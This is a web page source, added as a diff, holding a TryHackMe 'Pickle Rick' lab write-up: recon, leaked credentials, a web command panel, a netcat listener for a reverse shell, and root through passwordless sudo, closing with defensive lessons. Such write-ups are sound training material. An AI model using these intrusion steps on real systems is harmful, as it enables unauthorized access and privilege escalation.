@@ -1,0 +1,145 @@
+---
+import Article from "../../../layouts/Article.astro";
+import "../../../styles/writeup.css";
+import { withBase } from "../../../utils/paths";
+---
+
+<Article
+  title="THM Pickle Rick — Writeup"
+  description="TryHackMe Pickle Rick room walkthrough — credential leaks, web command panel RCE, reverse shell, and NOPASSWD sudo root privesc."
+  backHref={withBase('/writeups/thm')}
+  backLabel="cd ./writeups/thm"
+  navTitle="writeups/thm"
+  articleLabel={'TryHackMe "Pickle Rick"'}
+>
+<div class="container">
+<div class="writeup-header">
+  <span class="platform-tag">TryHackMe</span>
+  <h1>Pickle Rick</h1>
+  <p class="subtitle">Linux · Web enumeration · PHP command execution · Sudo misconfiguration</p>
+  <div class="meta">
+    <span class="meta-item os">Linux</span>
+    <span class="meta-item difficulty easy">Easy</span>
+  </div>
+  <div class="tags">
+    <span class="tag">Information Disclosure</span>
+    <span class="tag">Command Injection</span>
+    <span class="tag">Reverse Shell</span>
+    <span class="tag">Sudo NOPASSWD</span>
+  </div>
+</div>
+
+<div class="toc">
+  <div class="toc-title">Table of Contents</div>
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#recon">Reconnaissance</a></li>
+    <li><a href="#enum">Web Enumeration</a></li>
+    <li><a href="#foothold">Foothold — Command Panel</a></li>
+    <li><a href="#ingredients">Finding the Ingredients</a></li>
+    <li><a href="#privesc">Privilege Escalation</a></li>
+    <li><a href="#flags">Flags</a></li>
+    <li><a href="#takeaways">Lessons Learned</a></li>
+  </ul>
+</div>
+
+<section class="writeup-section" id="description">
+  <h2><span class="num">00</span> Description</h2>
+  <p>In this Rick and Morty-themed room, Rick has turned himself into a pickle again and cannot change back. You play Morty and must compromise his web server to recover the three secret ingredients he needs for the potion that turns him back into a human. The room is a good example of how a single web server can be attacked in several ways: reading exposed files, abusing a command panel, getting a reverse shell and escalating privileges. It shows how small weaknesses chain together into a full compromise.</p>
+  <figure class="screenshot"><img src={withBase('/assets/img/writeups/thm/pickle-rick-landing.jpg')} alt="Landing page"><figcaption>Landing page</figcaption></figure>
+</section>
+
+<section class="writeup-section" id="recon">
+  <h2><span class="num">01</span> Reconnaissance</h2>
+  <pre data-lang="bash"><code>nmap -sV -sC &lt;target-ip&gt;</code></pre>
+  <table>
+    <tr><th>Port</th><th>Service</th><th>Version</th></tr>
+    <tr><td>22</td><td>SSH</td><td>OpenSSH 8.2p1 (Ubuntu)</td></tr>
+    <tr><td>80</td><td>HTTP</td><td>Apache httpd 2.4.41 (Ubuntu)</td></tr>
+  </table>
+  <p>There were no SSH credentials at this stage, so the web server was the entry point.</p>
+</section>
+
+<section class="writeup-section" id="enum">
+  <h2><span class="num">02</span> Web Enumeration</h2>
+  <div class="step"><div class="step-num">1</div><div class="step-body">Viewing the HTML source revealed a comment containing a <strong style="color:#fff">username</strong>.</div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">Directory brute force exposed the application's important routes:<pre data-lang="bash"><code>gobuster dir -u http://&lt;target-ip&gt;/ -w /usr/share/wordlists/dirb/common.txt</code></pre></div></div>
+  <table>
+    <tr><th>Discovered path</th><th>Purpose</th></tr>
+    <tr><td><code>/robots.txt</code></td><td>Credential disclosure</td></tr>
+    <tr><td><code>/login.php</code></td><td>Login form</td></tr>
+    <tr><td><code>/portal.php</code></td><td>Command panel</td></tr>
+    <tr><td><code>/assets</code></td><td>Static resources</td></tr>
+  </table>
+  <p><code>/robots.txt</code> contained the odd string <code>Wubbalubbadubdub</code>. Used with the username leaked in the source, it gave access to <code>/login.php</code>.</p>
+</section>
+
+<section class="writeup-section" id="foothold">
+  <h2><span class="num">03</span> Foothold — Command Panel</h2>
+  <p><code>/portal.php</code> provided a command panel that executed system commands. Running <code>ls</code> listed the web root, while <code>whoami</code> returned <code>www-data</code>.</p>
+  <figure class="screenshot"><img src={withBase('/assets/img/writeups/thm/pickle-rick-command-panel.jpg')} alt="Command panel output"><figcaption>Command panel output</figcaption></figure>
+  <div class="callout"><strong>Command filtering:</strong> the panel's blacklist was only an application-layer restriction. It did not prevent an actual reverse shell from reaching the OS.</div>
+  <figure class="screenshot"><img src={withBase('/assets/img/writeups/thm/pickle-rick-blocked-command.jpg')} alt="Blocked command"><figcaption>Blocked command</figcaption></figure>
+  <h3>Reverse shell</h3>
+  <div class="step"><div class="step-num">1</div><div class="step-body">Start a listener on the attacker machine:<pre data-lang="bash"><code>nc -lvnp 4444</code></pre></div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">Submit a PHP reverse shell one-liner from <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> through the command panel.</div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-body">Stabilize the shell:<pre data-lang="bash"><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre></div></div>
+</section>
+
+<section class="writeup-section" id="ingredients">
+  <h2><span class="num">04</span> Finding the Ingredients</h2>
+  <h3>First ingredient</h3>
+  <p>With the shell established, the command filter no longer applied:</p>
+  <pre data-lang="bash"><code>ls
+cat /var/www/html/Sup3rS3cretPickl3Ingred.txt
+cat /var/www/html/clue.txt</code></pre>
+  <span class="flag">🚩 Ingredient 1 captured</span>
+  <p>The clue indicated that the remaining ingredients were elsewhere.</p>
+  <h3>Second ingredient</h3>
+  <pre data-lang="bash"><code>cd /home
+ls -la
+cd /home/rick
+ls -la
+cat *</code></pre>
+  <span class="flag">🚩 Ingredient 2 captured</span>
+</section>
+
+<section class="writeup-section" id="privesc">
+  <h2><span class="num">05</span> Privilege Escalation</h2>
+  <p>I checked the current user's sudo privileges:</p>
+  <pre data-lang="bash"><code>sudo -l</code></pre>
+  <pre data-lang="text"><code>User www-data may run the following commands on localhost:
+    (ALL) NOPASSWD: ALL</code></pre>
+  <p>The web service account could execute any command as root without a password.</p>
+  <div class="step"><div class="step-num">1</div><div class="step-body">Escalate directly:<pre data-lang="bash"><code>sudo su
+id
+# uid=0(root) gid=0(root) groups=0(root)</code></pre></div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">Search the root directory for the final ingredient:<pre data-lang="bash"><code>ls -la /root
+cat /root/*</code></pre><span class="flag">🚩 Ingredient 3 captured</span></div></div>
+</section>
+
+<section class="writeup-section" id="flags">
+  <h2><span class="num">06</span> Flags</h2>
+  <table>
+    <tr><th>#</th><th>Ingredient</th><th>Location</th></tr>
+    <tr><td>1</td><td><code>Sup3rS3cretPickl3Ingred.txt</code></td><td>Web root</td></tr>
+    <tr><td>2</td><td>Second ingredient file</td><td><code>/home/rick/</code></td></tr>
+    <tr><td>3</td><td>Third ingredient file</td><td><code>/root/</code></td></tr>
+  </table>
+  <h3>Attack chain</h3>
+  <p><code>Recon (nmap)</code> → page-source and <code>robots.txt</code> credential leaks → login → command panel RCE as <code>www-data</code> → reverse shell bypasses filtering → find ingredient 1 and 2 → <code>sudo -l</code> → <code>sudo su</code> → root → find ingredient 3.</p>
+</section>
+
+<section class="writeup-section" id="takeaways">
+  <h2><span class="num">07</span> Lessons Learned</h2>
+  <div class="takeaway-card">
+    <ul>
+      <li><strong>Check page source and robots.txt early.</strong> Credentials and sensitive application hints are often exposed in plain sight.</li>
+      <li><strong>A command blacklist is not a security boundary.</strong> Filtering web-panel input does not stop direct shell access.</li>
+      <li><strong>NOPASSWD sudo rights are dangerous.</strong> Giving <code>www-data</code> unrestricted sudo access creates an immediate root escalation path.</li>
+      <li><strong>Use strict controls for web command execution.</strong> Remove sudo rights from service accounts and use an allow-list through a hardened wrapper instead of a blacklist.</li>
+    </ul>
+  </div>
+</section>
+</div>
+</Article>
